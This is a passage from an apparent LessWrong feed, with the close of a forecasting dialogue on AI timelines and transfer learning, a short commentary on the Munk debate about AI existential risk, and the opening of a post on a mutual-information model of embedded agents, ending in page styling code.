user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 20:19:43 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><p> If it&#39;s only doing the R&amp;D then I would be lower than 95%, and the exact probability I give for AGI just depends on what that is supposed to mean. That&#39;s an important ambiguity in the operationalization Daniel gives, in my opinion.<br><br> In particular, if you have a system that can somehow basically automate AI R&amp;D but is unable to take over the other tasks involved in running an AI lab, that&#39;s something I don&#39;t expect and would push me far below the 95% forecast I provided above. In this case, I might only update upwards by some small amount based on (4) ->; (5), or maybe not at all.</p></div></section><h2> Overall summary, takeaways and next steps </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 20:36:52 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 20:36:52 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> Here is a summary of the discussion so far:</p><p> Daniel made an argument against Hofstadter&#39;s law for trend extrapolation and we discussed the validity of that for a bit.</p><p> A key thing that has come up as an interesting crux/observation is that Ege and Ajeya both don&#39;t expect a massive increase in transfer learning ability in the next few years. For Ege this matters a lot because it&#39;s one of the top reasons why AI will not speed up the economy and AI development that much. Ajeya thinks we can probably speed up AI R&amp;D anyways by making grizzly-bear-like-AI that doesn&#39;t have transfer as good as humans, but is just really good at ML engineering and AI R&amp;D because it was directly trained to be.</p><p> This makes observing substantial transfer learning a pretty relevant crux for Ege and Ajeya in the next few years/decades. Ege says he&#39;d have timelines more similar to Ajeya&#39;s if he observed this.</p><p> Daniel and Ajeya both think that the most plausible scenario is grizzly-bear-like AI with subhuman transfer but human-level or superhuman ML engineering skills, but while Daniel thinks it&#39;ll be relatively fast to work with the grizzly-bear-AIs to massively accelerate R&amp;D, Ajeya thinks that the lower-than-human level &quot;general intelligence&quot; / &quot;transfer&quot; will be a hindrance in a number of little ways, making her think it&#39;s plausible we&#39;ll need bigger models and/or more schlep. If Ajeya saw extreme transfer work out, she&#39;d update more toward thinking everything will be fast and easy, and thus have Daniel-like timelines (even though Daniel himself doesn&#39;t consider extreme transfer to be a crux for him.)</p><p> Daniel and Ege tried to elicit what concretely Ege expects to happen over the coming decades when AI progress continues but doesn&#39;t end up that transformative. Ege expects that AI will have a large effect on the economy, but assigns a substantial amount of probability on persistent deficiencies that prevent it from fully automating AI R&amp;D or very substantially accelerating semiconductor progress.</p><p> <i>(Ajeya, Daniel and Ege all thumbs-up this summary)</i> </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 20:37:37 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 20:37:37 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> Okay thanks everyone, heading out! </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 20:37:48 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 20:37:48 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> Thank you Ajeya! </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 20:38:04 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 20:38:04 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> Yes thanks Ajeya Ege and Oliver! Super fun. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 20:42:46 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 20:42:46 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> Thinking about future discussions on this topic, I think putting probabilities on the scenario that Daniel outlined was a bit hard given the limited time we had, but I quite like the idea of doing a more parallelized and symmetric version of this kind of thing where multiple participants output a concrete sequence of events, and then have other people forecast how they would update on each of those observations, which does seem like a fun way to elicit disagreements and cruxes.</p></div></section><div></div><br/><br/><a href="https://www.lesswrong.com/posts/K2D45BNxnZjdpSX2j/ai-timelines#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/K2D45BNxnZjdpSX2j/ai-timelines<guid ispermalink="false"> K2D45BNxnZjdpSX2j</guid><dc:creator><![CDATA[habryka]]></dc:creator><pubDate> Fri, 10 Nov 2023 05:28:24 GMT</pubDate> </item><item><title><![CDATA[Munk Debate on AI: a few observations and opinions]]></title><description><![CDATA[Published on November 10, 2023 2:00 AM GMT<br/><br/><p> <i>Previously covered on LessWrong</i> <a href="https://www.lesswrong.com/posts/LNwtnZ7MGTmeifkz3/munk-ai-debate-confusions-and-possible-cruxes"><i>here</i></a> <i>,</i> <a href="https://www.lesswrong.com/posts/CA7iLZHNT5xbLK59Y/did-bengio-and-tegmark-lose-a-debate-about-ai-x-risk-against"><i>here</i></a> <i>, and</i> <a href="https://www.lesswrong.com/posts/qsDPHZwjmduSMCJLv/the-partial-fallacy-of-dumb-superintelligence"><i>here</i></a> <i>.</i> </p><figure class="media"><div data-oembed-url="https://www.youtube.com/watch?v=144uOfr4SYA"><div><iframe src="https://www.youtube.com/embed/144uOfr4SYA" allow="autoplay; encrypted-media" allowfullscreen=""></iframe></div></div></figure><p> <strong>Observation #1:</strong> The debate isn&#39;t really about the proposition — on a very literal reading of the proposition. ( <a href="https://en.wikipedia.org/wiki/Max_Tegmark">Max Tegmark</a> : &quot;We&#39;re just arguing that the risk is not zero percent.&quot; <a href="https://en.wikipedia.org/wiki/Yann_LeCun">Yann LeCun</a> : &quot;...the risk is negligible...&quot;)</p><p> <strong>Opinion #1:</strong> A better proposition might be something like, &quot;We should slow down AI capabilities research for the sake of humanity.&quot; Or maybe, &quot;Researchers should open source frontier AI models.&quot;</p><hr><p> <strong>Observation #2:</strong> Yann LeCun is claiming that AI safety is (or ought to be) an empirical and iterative process. He believes AI will incrementally progress from mouse-level to human-level and beyond (ie there will be no fast takeoff). He&#39;s not <i>against</i> AI safety per se; he&#39;s just advocating a different approach to AI safety. ( <a href="https://en.wikipedia.org/wiki/Yoshua_Bengio">Yoshua Bengio</a> : &quot;It&#39;s interesting that you&#39;ve been proposing solutions to the safety problem, which means you believe we need to build safe AI. Which means that there is a problem that needs to be fixed.&quot;)</p><p> <strong>Opinion #2:</strong> LeCun catches a lot of flak among people who take AI x-risk very seriously. But I don&#39;t see why his proposed approach to AI safety is wrong or reckless or misinformed. In this vein, Sam Altman <a href="https://forum.effectivealtruism.org/posts/vuATadXMheRhBvXfi/sam-altman-safety-and-capabilities-are-not-these-two">recently asserted</a> that &quot;safety and capabilities are not these two separate things&quot;. I think that&#39;s a claim that is worth seriously considering. I think it&#39;s worth thinking through the implications of that claim for AI safety. Maybe an empirical, iterative approach to AI safety is the most realistic path forward.</p><hr><p> <strong>Observation #3:</strong> <a href="https://en.wikipedia.org/wiki/Melanie_Mitchell">Melanie Mitchell</a> &#39;s central view is that superhuman AGI is so far off that it&#39;s not worth taking seriously right now. (&quot;We can acknowledge the incredible advances in AI without extrapolating to unfounded speculations of emerging superintelligent AI.&quot;) This doesn&#39;t seem to be LeCun&#39;s view.</p><p> <strong>Opinion #3:</strong> It would have been more interesting (to me, at least) to get a second debater on the con side who agrees that AGI can easily be made safe and who could give arguments to that effect, rather than just expressing general skepticism about the near-term prospects of AGI.</p><br/><br/> <a href="https://www.lesswrong.com/posts/Lx4BfG4kjNqxzfbt9/munk-debate-on-ai-a-few-observations-and-opinions#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/Lx4BfG4kjNqxzfbt9/munk-debate-on-ai-a-few-observations-and-opinions<guid ispermalink="false"> Lx4BfG4kjNqxzfbt9</guid><dc:creator><![CDATA[Yarrow Bouchard]]></dc:creator><pubDate> Fri, 10 Nov 2023 02:00:56 GMT</pubDate> </item><item><title><![CDATA[ACI#6: A Non-Dualistic ACI Model]]></title><description><![CDATA[Published on November 9, 2023 11:01 PM GMT<br/><br/><p> Most traditional AI models are dualistic. As <a href="https://www.lesswrong.com/s/Rm6oQRJJmhGCcLvxh/p/i3BTagvt3HbPMx6PN">Demski &amp; Garrabrant have pointed out</a> , these models assume that an agent is an object that persists over time, and has well-defined input/output channels, like it&#39;s playing a video game.</p><p> In the real world, however, agents are embedded in the environment, and there&#39;s no well-defined boundary between the agent and the environment. That&#39;s why a non-dualistic model is needed to depict how the boundary and input/output channels emerge from more fundamental notions.</p><p> For example, in Scott Garrabrant&#39;s <a href="https://www.lesswrong.com/posts/BSpdshJWGAW6TuNzZ/introduction-to-cartesian-frames"><i>Cartesian Frames</i></a> , input and output can be derived from &quot;an agent&#39;s ability to freely choose&quot; among &quot;possible ways an agent can be&quot;.</p><p> However, choosing is still one of the key concepts of Cartesian Frames, but from a non-dualistic perspective, &quot;it&#39;s not clear what it even means for an embedded agent to choose an option&quot;, since an embedded agent is &quot;the universe poking itself&quot;. Formalizing the idea of choice in a non-dualistic model is as difficult as formalizing the idea of free will.</p><p> To avoid relying on the notion &quot;choosing&quot;, we have proposed the <strong>General Algorithmic Common Intelligence (gACI)</strong> model which describes embedded agents solely from a third-person perspective, and measures the actions of agents using mutual information in an event-centric framework.</p><p> The gACI model does not attempt to answer the question &quot;What should an agent do?&quot;. Instead, it focuses on describing the emergence of the agent-environment boundary, and answering the question &quot;Why does an individual feel like it&#39;s choosing?&quot;</p><p> In the language of decision theory, gACI belongs to descriptive decision theory rather than normative decision theory.</p><p></p><h2> <strong>Communication Channel and Mutual Information</strong></h2><p> In dualistic intelligence models, an agent receives <strong>input</strong> information from the environment, and manipulates the environment through <strong>output</strong> actions. But real-world agents are embedded within the environment, it&#39;s not easy to confine information exchange to a clear input/output channel.</p><p> In the gACI model, on the other hand, the input/output channel is a communication channel, in which the information transfer between a sender and a receiver is measured by <strong>mutual information</strong> . </p><p></p><p><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/fv0swt2m94bctlwpgrpj" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/lpkjtoj84pu9z2tcmztu 150w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/dyzvjguu0l5ojlmzds6i 300w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/eug8w6vqahli2kkqqsyv 450w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/kzz2ijsxk7hbnwyq6wqb 600w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/iizlpd4qt74hckytqqah 750w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/eazgyyfppdisqxy1ufdf 900w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/my6bunbnhpzgg0efhnsf 1050w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/ef2vcilpubwaljavidpx 1200w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/dywgnfnxwftveb8kmtqg 1350w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/bqx3diq5o1pgkdbdutnw 1500w"><br> <i>Figure 1: From the dualistic input/output model to the mutual information model.</i></p><p></p><p> We can easily define mutual information between the states of any two objects, without specifying how the information is transmitted, or who is the sender and who is the receiver, or what the transmission medium is, or whether they are direct or indirect connected.</p><p> These two objects can be any parts of the world, such as agents, the environment, or any parts of agents or the environment, whose boundaries can be drawn anywhere if necessary. They can even overlap.</p><p> Having mutual information does not always mean knowing or understanding, but it provides an upper bound for knowing or understanding.</p><p> With mutual information of two objects, we can define memories and prophecies.</p><p></p><h2> <strong>Memory and Prophecy</strong></h2><p> <strong>Memory</strong> is information about the past, or a communication channel that transmits information about the past into the future ( <a href="https://drive.google.com/file/d/1t_npcCLGVO3Dr01sDVxd_KDp0xDv-yi2/view">Gershman 2021</a> ).  If A is the receiver and B is the sender, we can define: A&#39;s memory of B is the mutual information between the present state of A and a past state of B:</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="M(A,B,t)=I(A(t_0);B(t)), &nbsp; t<t_0"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.081em;">M</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.064em;">I</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.151em; padding-bottom: 0.519em;">;</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.225em; padding-bottom: 0.372em;">&lt;</span></span> <span class="mjx-msubsup MJXc-space3"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span></span></span></span></span></span> <style>.mjx-chtml {display: inline-block; line-height: 0; text-indent: 0; text-align: left; text-transform: none; font-style: normal; font-weight: normal; font-size: 100%; font-size-adjust: none; letter-spacing: normal; word-wrap: normal; word-spacing: normal; white-space: nowrap; float: none; direction: ltr; max-width: none; max-height: none; min-width: 0; min-height: 0; border: 0; margin: 0; padding: 1px 0}
.MJXc-display {display: block; text-align: center; margin: 1em 0; padding: 0}
.mjx-chtml[tabindex]:focus, body :focus .mjx-chtml[tabindex] {display: inline-table}
.mjx-full-width {text-align: center; display: table-cell!important; width: 10000em}
.mjx-math {display: inline-block; border-collapse: separate; border-spacing: 0}
.mjx-math * {display: inline-block; -webkit-box-sizing: content-box!important; -moz-box-sizing: content-box!important; box-sizing: content-box!important; text-align: left}
.mjx-numerator {display: block; text-align: center}
.mjx-denominator {display: block; text-align: center}
.MJXc-stacked {height: 0; position: relative}
.MJXc-stacked > * {position: absolute}
.MJXc-bevelled > * {display: inline-block}
.mjx-stack {display: inline-block}
.mjx-op {display: block}
.mjx-under {display: table-cell}
.mjx-over {display: block}
.mjx-over > * {padding-left: 0px!important; padding-right: 0px!important}
.mjx-under > * {padding-left: 0px!important; padding-right: 0px!important}
.mjx-stack > .mjx-sup {display: block}
.mjx-stack > .mjx-sub {display: block}
.mjx-prestack > .mjx-presup {display: block}
.mjx-prestack > .mjx-presub {display: block}
.mjx-delim-h > .mjx-char {display: inline-block}
.mjx-surd {vertical-align: top}
.mjx-surd + .mjx-box {display: inline-flex}
.mjx-mphantom * {visibility: hidden}
.mjx-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 2px 3px; font-style: normal; font-size: 90%}
.mjx-annotation-xml {line-height: normal}
.mjx-menclose > svg {fill: none; stroke: currentColor; overflow: visible}
.mjx-mtr {display: table-row}
.mjx-mlabeledtr {display: table-row}
.mjx-mtd {display: table-cell; text-align: center}
.mjx-label {display: table-row}
.mjx-box {display: inline-block}
.mjx-block {display: block}
.mjx-span {display: inline}
.mjx-char {display: block; white-space: pre}
.mjx-itable {display: inline-table; width: auto}
.mjx-row {display: table-row}
.mjx-cell {display: table-cell}
.mjx-table {display: table; width: 100%}
.mjx-line {display: block; height: 0}
.mjx-strut {width: 0; padding-top: 1em}
.mjx-vsize {width: 0}
.MJXc-space1 {margin-left: .167em}
.MJXc-space2 {margin-left: .222em}
.MJXc-space3 {margin-left: .278em}
.mjx-test.mjx-test-display {display: table!important}
.mjx-test.mjx-test-inline {display: inline!important; margin-right: -1px}
.mjx-test.mjx-test-default {display: block!important; clear: both}
.mjx-ex-box {display: inline-block!important; position: absolute; overflow: hidden; min-height: 0; max-height: none; padding: 0; border: 0; margin: 0; width: 1px; height: 60ex}
.mjx-test-inline .mjx-left-box {display: inline-block; width: 0; float: left}
.mjx-test-inline .mjx-right-box {display: inline-block; width: 0; float: right}
.mjx-test-display .mjx-right-box {display: table-cell!important; width: 10000em!important; min-width: 0; max-width: none; padding: 0; border: 0; margin: 0}
.MJXc-TeX-unknown-R {font-family: monospace; font-style: normal; font-weight: normal}
.MJXc-TeX-unknown-I {font-family: monospace; font-style: italic; font-weight: normal}
.MJXc-TeX-unknown-B {font-family: monospace; font-style: normal; font-weight: bold}
.MJXc-TeX-unknown-BI {font-family: monospace; font-style: italic; font-weight: bold}
.MJXc-TeX-ams-R {font-family: MJXc-TeX-ams-R,MJXc-TeX-ams-Rw}
.MJXc-TeX-cal-B {font-family: MJXc-TeX-cal-B,MJXc-TeX-cal-Bx,MJXc-TeX-cal-Bw}
.MJXc-TeX-frak-R {font-family: MJXc-TeX-frak-R,MJXc-TeX-frak-Rw}
.MJXc-TeX-frak-B {font-family: MJXc-TeX-frak-B,MJXc-TeX-frak-Bx,MJXc-TeX-frak-Bw}
.MJXc-TeX-math-BI {font-family: MJXc-TeX-math-BI,MJXc-TeX-math-BIx,MJXc-TeX-math-BIw}
.MJXc-TeX-sans-R {font-family: MJXc-TeX-sans-R,MJXc-TeX-sans-Rw}
.MJXc-TeX-sans-B {font-family: MJXc-TeX-sans-B,MJXc-TeX-sans-Bx,MJXc-TeX-sans-Bw}
.MJXc-TeX-sans-I {font-family: MJXc-TeX-sans-I,MJXc-TeX-sans-Ix,MJXc-TeX-sans-Iw}
.MJXc-TeX-script-R {font-family: MJXc-TeX-script-R,MJXc-TeX-script-Rw}
.MJXc-TeX-type-R {font-family: MJXc-TeX-type-R,MJXc-TeX-type-Rw}
.MJXc-TeX-cal-R {font-family: MJXc-TeX-cal-R,MJXc-TeX-cal-Rw}
.MJXc-TeX-main-B {font-family: MJXc-TeX-main-B,MJXc-TeX-main-Bx,MJXc-TeX-main-Bw}
.MJXc-TeX-main-I {font-family: MJXc-TeX-main-I,MJXc-TeX-main-Ix,MJXc-TeX-main-Iw}
.MJXc-TeX-main-R {font-family: MJXc-TeX-main-R,MJXc-TeX-main-Rw}
.MJXc-TeX-math-I {font-family: MJXc-TeX-math-I,MJXc-TeX-math-Ix,MJXc-TeX-math-Iw}
.MJXc-TeX-size1-R {font-family: MJXc-TeX-size1-R,MJXc-TeX-size1-Rw}
.MJXc-TeX-size2-R {font-family: MJXc-TeX-size2-R,MJXc-TeX-size2-Rw}
.MJXc-TeX-size3-R {font-family: MJXc-TeX-size3-R,MJXc-TeX-size3-Rw}
.MJXc-TeX-size4-R {font-family: MJXc-TeX-size4-R,MJXc-TeX-size4-Rw}
.MJXc-TeX-vec-R {font-family: MJXc-TeX-vec-R,MJXc-TeX-vec-Rw}
.MJXc-TeX-vec-B {font-family: MJXc-TeX-vec-B,MJXc-TeX-vec-Bx,MJXc-TeX-vec-Bw}
@font-face {font-family: MJXc-TeX-ams-R; src: local('MathJax_AMS'), local('MathJax_AMS-Regular')}
@font-face {font-family: MJXc-TeX-ams-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_AMS-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_AMS-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_AMS-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-cal-B; src: local('MathJax_Caligraphic Bold'), local('MathJax_Caligraphic-Bold')}
@font-face {font-family: MJXc-TeX-cal-Bx; src: local('MathJax_Caligraphic'); font-weight: bold}
@font-face {font-family: MJXc-TeX-cal-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Caligraphic-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Caligraphic-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Caligraphic-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-frak-R; src: local('MathJax_Fraktur'), local('MathJax_Fraktur-Regular')}
@font-face {font-family: MJXc-TeX-frak-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Fraktur-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Fraktur-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Fraktur-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-frak-B; src: local('MathJax_Fraktur Bold'), local('MathJax_Fraktur-Bold')}
@font-face {font-family: MJXc-TeX-frak-Bx; src: local('MathJax_Fraktur'); font-weight: bold}
@font-face {font-family: MJXc-TeX-frak-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Fraktur-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Fraktur-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Fraktur-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-math-BI; src: local('MathJax_Math BoldItalic'), local('MathJax_Math-BoldItalic')}
@font-face {font-family: MJXc-TeX-math-BIx; src: local('MathJax_Math'); font-weight: bold; font-style: italic}
@font-face {font-family: MJXc-TeX-math-BIw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Math-BoldItalic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Math-BoldItalic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Math-BoldItalic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-sans-R; src: local('MathJax_SansSerif'), local('MathJax_SansSerif-Regular')}
@font-face {font-family: MJXc-TeX-sans-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_SansSerif-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_SansSerif-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_SansSerif-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-sans-B; src: local('MathJax_SansSerif Bold'), local('MathJax_SansSerif-Bold')}
@font-face {font-family: MJXc-TeX-sans-Bx; src: local('MathJax_SansSerif'); font-weight: bold}
@font-face {font-family: MJXc-TeX-sans-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_SansSerif-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_SansSerif-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_SansSerif-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-sans-I; src: local('MathJax_SansSerif Italic'), local('MathJax_SansSerif-Italic')}
@font-face {font-family: MJXc-TeX-sans-Ix; src: local('MathJax_SansSerif'); font-style: italic}
@font-face {font-family: MJXc-TeX-sans-Iw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_SansSerif-Italic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_SansSerif-Italic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_SansSerif-Italic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-script-R; src: local('MathJax_Script'), local('MathJax_Script-Regular')}
@font-face {font-family: MJXc-TeX-script-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Script-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Script-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Script-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-type-R; src: local('MathJax_Typewriter'), local('MathJax_Typewriter-Regular')}
